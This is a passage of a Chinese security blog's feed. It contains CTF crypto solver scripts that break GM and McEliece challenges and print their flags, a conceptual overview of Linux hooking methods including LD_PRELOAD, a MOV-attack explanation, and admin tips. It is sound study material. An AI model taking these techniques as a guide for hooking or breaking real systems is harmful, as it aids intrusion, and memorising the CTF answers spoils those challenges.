class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#author: zraxx</span></span><br><span class="line"><span class="comment">#date: 2020-4-19</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"output"</span>, <span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">f = f.readlines()</span><br><span class="line"></span><br><span class="line">phin = int(f[<span class="number">0</span>].strip())</span><br><span class="line">n = int(f[<span class="number">1</span>].strip())</span><br><span class="line">enc = eval(f[<span class="number">2</span>].strip())</span><br><span class="line"></span><br><span class="line">a = n-phin+<span class="number">1</span></span><br><span class="line"><span class="comment"># print iroot(a**2-4*n, 2)</span></span><br><span class="line">p = (a+iroot(a**<span class="number">2</span><span class="number">-4</span>*n, <span class="number">2</span>)[<span class="number">0</span>])//<span class="number">2</span></span><br><span class="line"><span class="keyword">assert</span> n%p==<span class="number">0</span></span><br><span class="line"></span><br><span class="line">res = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> enc:</span><br><span class="line"><span class="keyword">if</span> pow(x, (p<span class="number">-1</span>)//<span class="number">2</span>, p) == <span class="number">1</span>:</span><br><span class="line">res = res + <span class="string">'0'</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">res = res + <span class="string">'1'</span></span><br><span class="line"></span><br><span class="line">print(long_to_bytes(int(res,<span class="number">2</span>)))</span><br></pre></td></tr></table></figure><p><strong>FLAG: flag{bd4f1790-f4a2-4904-b4d2-8db8b24fd864}</strong></p><h3 id="McEliece"><a href="#McEliece" class="headerlink" title="McEliece"></a>McEliece</h3><p>根据pubkey可以得出，加密时plain长为28bit，结果为64bit，错误码中6位为1。由于flag中的字符类型有限，可以直接爆破，计算的结果$uG’$和题目给出的加密的结果$uG’+e$应该满足海明距离小于等于6。</p><p>代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#author: zraxx</span></span><br><span class="line"><span class="comment">#date: 2020-4-19</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"></span><br><span class="line">pubkey=load(<span class="string">"./pubkey.sobj"</span>)</span><br><span class="line">cipher=load(<span class="string">"./cipher.sobj"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(plain)</span>:</span></span><br><span class="line"><span class="keyword">return</span> plain*pubkey</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">same</span><span class="params">(a, b)</span>:</span></span><br><span class="line">sum = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(a.ncols()):</span><br><span class="line"><span class="keyword">if</span> a[<span class="number">0</span>,i] == b[<span class="number">0</span>,i]:</span><br><span class="line">sum += <span class="number">1</span></span><br><span class="line"><span class="keyword">return</span> sum</span><br><span class="line"></span><br><span class="line">l = <span class="number">28</span></span><br><span class="line">t = <span class="string">"0123456789abcdef-&#125;"</span></span><br><span class="line">len = <span class="number">2</span></span><br><span class="line"></span><br><span class="line">flag=<span class="string">"flag&#123;c9"</span></span><br><span class="line">prev_cand=[]</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> len&lt;<span class="number">12</span>:</span><br><span class="line"><span class="keyword">print</span> len</span><br><span class="line">cand = <span class="string">""</span></span><br><span class="line">iter = product(t, repeat=<span class="number">4</span>)</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> iter:</span><br><span class="line">tmp = flag+<span class="string">""</span>.join(x)</span><br><span class="line">bin = BinaryStrings()</span><br><span class="line">msg = map(int ,str(bin.encoding(tmp)))</span><br><span class="line">plain = matrix(GF(<span class="number">2</span>),<span class="number">1</span>,l)</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(l):</span><br><span class="line">plain[<span class="number">0</span>,j] = msg[l*len+j]</span><br><span class="line"><span class="keyword">if</span> same(cipher[len], encrypt(plain))&gt;=(<span class="number">64</span><span class="number">-6</span>):</span><br><span class="line"><span class="keyword">if</span> len%<span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">prev_cand.append(x[<span class="number">3</span>])</span><br><span class="line">cand = x</span><br><span class="line"><span class="keyword">print</span> <span class="string">""</span>.join(x)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">if</span> x[<span class="number">0</span>] <span class="keyword">in</span> prev_cand:</span><br><span class="line">flag += <span class="string">""</span>.join(x)</span><br><span class="line">prev_cand = []</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> len%<span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">flag+=<span class="string">""</span>.join(cand[:<span class="number">3</span>])</span><br><span class="line"><span class="keyword">print</span> flag</span><br><span class="line">len += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> flag</span><br><span class="line"></span><br><span class="line"><span class="comment">#flag&#123;c941a3cc-85e3-4401-a0f1-764206e71bf3&#125;</span></span><br></pre></td></tr></table></figure><p><strong>FLAG: flag{c941a3cc-85e3-4401-a0f1-764206e71bf3}</strong></p>]]></content>
    
    <summary type="html">
    
      
      
        
        
          &lt;h3 id=&quot;GM&quot;&gt;&lt;a href=&quot;#GM&quot; class=&quot;headerlink&quot; title=&quot;GM&quot;&gt;&lt;/a&gt;GM&lt;/h3&gt;&lt;p&gt;根据&lt;code&gt;pow(q ** 2 * x, (p-1)/2, p) + pow(p ** 2 * x, (q-1)/2, q) ==
        
      
    
    </summary>
    
    
    
      <category term="CTF" scheme="https://zrax-x.github.io/tags/CTF/"/>
    
      <category term="密码学" scheme="https://zrax-x.github.io/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>Linux Hook技术介绍</title>
    <link href="https://zrax-x.github.io/2020/04/18/Linux-Hook%E6%8A%80%E6%9C%AF%E4%BB%8B%E7%BB%8D/"/>
    <id>https://zrax-x.github.io/2020/04/18/Linux-Hook%E6%8A%80%E6%9C%AF%E4%BB%8B%E7%BB%8D/</id>
    <published>2020-04-18T07:00:00.000Z</published>
    <updated>2020-04-20T01:09:47.089Z</updated>
    
    <content type="html"><![CDATA[<p>Linux常见的hook技术主要有四种，分别为内核模块hook，应用层inline hook，应用层Got hook以及应用层preload hook。下面具体介绍一下</p><h3 id="内核模块hook"><a href="#内核模块hook" class="headerlink" title="内核模块hook"></a>内核模块hook</h3><blockquote><p>通常是从内核源码特殊位置，修改回调、修改中断表；或修改重编译内核，导出内部函数，从而跳转到自定义函数，开发内核模块实现hook。 </p><p>其特性如下：</p><ul><li>可以拦截到所有应用层系统调用，应用层无法绕过</li><li>开发调试复杂，测试周期长，升级和卸载内核模块带来稳定性问题</li></ul></blockquote><h3 id="应用层inline-Hook"><a href="#应用层inline-Hook" class="headerlink" title="应用层inline Hook"></a>应用层inline Hook</h3><blockquote><p>应用层内联hook，即直接修改二进制函数体的汇编指令，修改执行逻辑使其跳转到自定义函数，开发应用层模块实现hook。 </p><p>其特性如下：</p><ul><li>可以拦截到系统调用和普通库函数</li><li>由于linux系统本身具有多个发行版本及指令集，不容易做到通用</li><li>可以通过自定义实现底层函数或恢复模块内存方式绕过</li></ul></blockquote><h3 id="应用层Got-Hook"><a href="#应用层Got-Hook" class="headerlink" title="应用层Got Hook"></a>应用层Got Hook</h3><blockquote><p>应用层got表hook，即在运行阶段修改程序本身got表，这样调用api的逻辑，就会相应的跳转到用户自定义函数中。</p><ul><li>可以拦截系统调用和普通库函数</li><li>由于只需要考虑ELF格式因此实现难度较为简单</li><li>可以通过自定义实现底层函数或恢复got表内存方式绕过</li></ul></blockquote><h3 id="Preload-Hook"><a href="#Preload-Hook" class="headerlink" title="Preload Hook"></a>Preload Hook</h3><blockquote><p>  Preload Hook是指利用系统支持的preload能力，将模块自动注入进程实现hook。可以通过以下手段使用Preload技术：一种是环境变量配置(LD_PRELOAD)；另一种是文件配置：(/etc/ld.so.preload)。</p><ul><li>若使用命令行指定LD_PRELOAD则只影响该新进程及子进程；若写入全局环境变量则LD_PRELOAD对所有新进程生效；父进程可以控制子进程的环境变量从而取消preload</li><li>文件preload方式影响所有新进程且无法被取消</li><li>可以拦截到系统调用和普通库函数</li><li>实现和操作最为简单，只需要编写同名系统调用函数即可实现hook</li><li>可以使用动态调用方式或自定义实现方式绕过</li></ul></blockquote><h4 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h4><p><a href="https://www.jianshu.com/p/69e6089a7291" target="_blank" rel="noopener">https://www.jianshu.com/p/69e6089a7291</a></p><p><a href="https://www.jianshu.com/p/f78b16bd8905" target="_blank" rel="noopener">https://www.jianshu.com/p/f78b16bd8905</a></p>]]></content>
    
    <summary type="html">
    
      
      
        
        
          &lt;p&gt;Linux常见的hook技术主要有四种，分别为内核模块hook，应用层inline hook，应用层Got hook以及应用层preload hook。下面具体介绍一下&lt;/p&gt;
&lt;h3 id=&quot;内核模块hook&quot;&gt;&lt;a href=&quot;#内核模块hook&quot;
        
      
    
    </summary>
    
    
    
      <category term="Linux" scheme="https://zrax-x.github.io/tags/Linux/"/>
    
      <category term="Hook" scheme="https://zrax-x.github.io/tags/Hook/"/>
    
  </entry>
  
  <entry>
    <title>Linux终端控制打印字符的颜色</title>
    <link href="https://zrax-x.github.io/2020/04/17/Linux%E7%BB%88%E7%AB%AF%E6%8E%A7%E5%88%B6%E6%89%93%E5%8D%B0%E5%AD%97%E7%AC%A6%E7%9A%84%E9%A2%9C%E8%89%B2/"/>
    <id>https://zrax-x.github.io/2020/04/17/Linux%E7%BB%88%E7%AB%AF%E6%8E%A7%E5%88%B6%E6%89%93%E5%8D%B0%E5%AD%97%E7%AC%A6%E7%9A%84%E9%A2%9C%E8%89%B2/</id>
    <published>2020-04-18T01:05:04.854Z</published>
    <updated>2020-04-18T01:05:24.499Z</updated>
    
    <content type="html"><![CDATA[<p>格式：\033[控制码;背景颜色;前景颜色m字符串\033[0m </p><p><em>注意：\033可以替换为\x1b，同指 Esc ，各个属性的范围不同，因此不会混淆</em></p><p><strong>前景色：</strong>30-37</p><p><strong>背景色：</strong>40-47</p><p><strong>控制码：</strong></p><blockquote><p>\33[0m 关闭所有属性<br>\33[1m 设置高亮度<br>\33[4m 下划线<br>\33[5m 闪烁<br>\33[7m 反显<br>\33[8m 消隐<br>\33[30m — \33[37m 设置前景色<br>\33[40m — \33[47m 设置背景色<br>\33[nA 光标上移n行<br>\33[nB 光标下移n行<br>\33[nC 光标右移n行<br>\33[nD 光标左移n行<br>\33[y;xH设置光标位置<br>\33[2J 清屏<br>\33[K 清除从光标到行尾的内容<br>\33[s 保存光标位置<br>\33[u 恢复光标位置<br>\33[?25l 隐藏光标<br>\33[?25h 显示光标</p></blockquote><p><strong>以下为常用的三种类型</strong></p><p>\x1b[1;31m字符串\x1b[0m    <font color="red"> 高亮红色字体（error）</font></p><p>\x1b[1;33m字符串\x1b[0m    <font color="yellow"> 高亮黄色字体（info）</font></p><p>\x1b[1;34m字符串\x1b[0m    <font color="blue"> 高亮蓝色字体（debug）</font></p>]]></content>
    
    <summary type="html">
    
      
      
        
        
          &lt;p&gt;格式：\033[控制码;背景颜色;前景颜色m字符串\033[0m &lt;/p&gt;
&lt;p&gt;&lt;em&gt;注意：\033可以替换为\x1b，同指 Esc
        
      
    
    </summary>
    
    
    
      <category term="Linux" scheme="https://zrax-x.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>VolgaCTF-2020-Keygreed-WP</title>
    <link href="https://zrax-x.github.io/2020/04/17/VolgaCTF-Keygreed/"/>
    <id>https://zrax-x.github.io/2020/04/17/VolgaCTF-Keygreed/</id>
    <published>2020-04-18T00:52:57.376Z</published>
    <updated>2020-04-18T00:45:39.965Z</updated>
    
    <content type="html"><![CDATA[<p>关于mov attack，可以参考这篇<a href="https://blog.csdn.net/qq_26060285/article/details/90482755" target="_blank" rel="noopener">博客</a></p><p>下面简单说说这道题</p><p>首先我们可以验证这个椭圆曲线是超奇异的(supersingular)，在这里 $p^2 - 1 = 0\mod p.order()$</p><blockquote><p>The MOV attack works by using the <a href="https://en.wikipedia.org/wiki/Weil_pairing" target="_blank" rel="noopener">Weil pairing</a> (e: $E[m]×E[m]→μ_m$) to translate solving the dlog in the elliptic curve group to solving it in the multiplicative group $μ_m$ (group of m-th roots of unity), where sub-exponential algorithms exist. </p><p>Then, working in $F_{p^k}$ (extension of $F_p$), take Q to be a point in $E[m]$ (group of m-torsion points), such that P,Q are linearly independent, which can be constructed. Finally, take $e(P,Q)$ and $e(xP,Q)=e(P,Q)^x$ (due to bilinearity of e) as a dlog instance over a fininte field (m-th roots of unity), this is true by the non-degeneracy of the Weil pairing.</p></blockquote><p>因此这里的关键就是找到点Q，然后便把问题转化为了一个离散对数问题，寻找点Q的步骤如下</p><ol><li>在$F_{p^k}$上随机选取一个点，记为$R$</li><li>计算$m=R.order()$</li><li>计算$d=gcd(m,P.order)$</li><li>得到$Q=(m//d)*R$</li></ol><p>得到$Q$后，由于$Q=k*P$，因此问题就变得简单了很多。</p><p>好了，到了这里，事实上我还是没有搞懂MOV attack的具体原理，也没有讲清楚这道题的具体解法。不过没关系，后续可以慢慢理解，而且我认为我已经把MOV attack中的最重要的一个环节简单的阐述了一下。</p><p>Anyway，如果想看看这道题的具体解法，可以参考这篇<a href="https://sectt.github.io/writeups/Volga20/crypto_keygreed/README" target="_blank" rel="noopener">WriteUp</a></p>]]></content>
    
    <summary type="html">
    
      
      
        
        
          &lt;p&gt;关于mov attack，可以参考这篇&lt;a href=&quot;https://blog.csdn.net/qq_26060285/article/details/90482755&quot; target=&quot;_blank&quot;
        
      
    
    </summary>
    
    
    
      <category term="CTF" scheme="https://zrax-x.github.io/tags/CTF/"/>
    
      <category term="密码学" scheme="https://zrax-x.github.io/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
      <category term="ECC" scheme="https://zrax-x.github.io/tags/ECC/"/>
    
      <category term="MOV attack" scheme="https://zrax-x.github.io/tags/MOV-attack/"/>
    
  </entry>
  
  <entry>
    <title>Linux下批量kill多个同名进程</title>
    <link href="https://zrax-x.github.io/2020/04/16/Linux%E4%B8%8B%E6%89%B9%E9%87%8Fkill%E5%A4%9A%E4%B8%AA%E5%90%8C%E5%90%8D%E8%BF%9B%E7%A8%8B/"/>
    <id>https://zrax-x.github.io/2020/04/16/Linux%E4%B8%8B%E6%89%B9%E9%87%8Fkill%E5%A4%9A%E4%B8%AA%E5%90%8C%E5%90%8D%E8%BF%9B%E7%A8%8B/</id>
    <published>2020-04-17T06:54:25.292Z</published>
    <updated>2020-04-17T08:24:08.762Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>循序渐进</p><p>第一步：ps -ef | grep [name] 筛选出同名的所有进程</p><p>第二步：ps -ef | grep [name] | grep -v grep 将第一步中的grep进程删除</p><p>第三步：ps -ef | grep [name] | grep -v grep | cut -c 1-5 截断获取所有的pid号，这里cut的作用就是截取，1-5的作用是根据下标取出pid号，类似于python的切片，需要根据实际情况来调整</p><p>第四步：ps -ef | grep [name] | grep -v grep | cut -c 1-5 | xargs kill -9 将之前的所有pid作为kill命令的参数 </p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        
        
          &lt;blockquote&gt;
&lt;p&gt;循序渐进&lt;/p&gt;
&lt;p&gt;第一步：ps -ef | grep [name] 筛选出同名的所有进程&lt;/p&gt;
&lt;p&gt;第二步：ps -ef | grep [name] | grep -v grep 将第一步中的grep进程删除&lt;/p&gt;
&lt;p&gt;第三步：ps
        
      
    
    </summary>
    
    
    
      <category term="Linux" scheme="https://zrax-x.github.io/tags/Linux/"/>
    
  </entry>
  
</feed>
